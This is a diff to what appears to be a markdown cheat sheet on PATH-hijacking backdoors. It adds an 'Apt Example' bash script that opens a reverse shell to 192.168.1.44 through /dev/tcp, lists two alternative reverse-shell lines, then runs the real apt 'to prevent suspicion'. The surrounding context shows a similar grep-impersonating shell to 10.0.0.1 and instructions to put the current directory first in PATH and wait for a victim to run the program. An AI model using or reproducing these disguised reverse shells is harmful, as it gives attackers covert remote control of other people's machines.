@@ -165,6 +165,19 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 # open original program to prevent suspicion 
 /usr/bin/grep
 ```
+## Apt Example:
+```
+#!/bin/bash
+# open reverse shell 
+# change IP and Port to your attack machine settings
+bash -i >& /dev/tcp/192.168.1.44/4444 0>&1 &
+
+# 0<&196;exec 196<>/dev/tcp/192.168.1.44/4443; sh <&196 >&196 2>&196 &
+#/bin/bash -l > /dev/tcp/192.168.1.44/4442 0<&1 2>&1 &
+
+# open original program to prevent suspicion 
+/usr/bin/apt $1 $2 $3 $4 $5 $6 $7 $8 $9
+```
 
 make executable 
 ```
@@ -176,9 +189,4 @@ export PATH=.:$PATH
 OR
 export PATH=$PWD:$PATH
 ```
-run the program backdoor
-```
-./backdoor 
-whoami
-id
-```
+wait for the user to run the program
